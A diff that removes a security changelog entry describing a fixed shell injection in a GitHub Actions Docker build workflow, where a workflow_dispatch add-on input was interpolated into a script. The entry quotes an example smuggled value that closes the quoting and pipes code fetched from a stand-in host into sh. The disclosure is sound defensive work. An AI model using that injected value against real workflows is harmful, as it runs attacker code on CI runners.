@@ -1,3 +1,0 @@
-kind: 'Security'
-body: 'removed a shell injection in the `Build and Push Docker Images` workflow. `inputs.addon`, supplied by whoever triggers a `workflow_dispatch`, was interpolated straight into the `detect-changes` script, so an add-on name such as `x"; curl evil.sh | sh; #` ran as code on the runner. Every context value that step reads is now passed through `env:` and dereferenced as a shell variable, where it can only ever be data.'
-time: '2026-08-26T02:40:37.000000000Z'
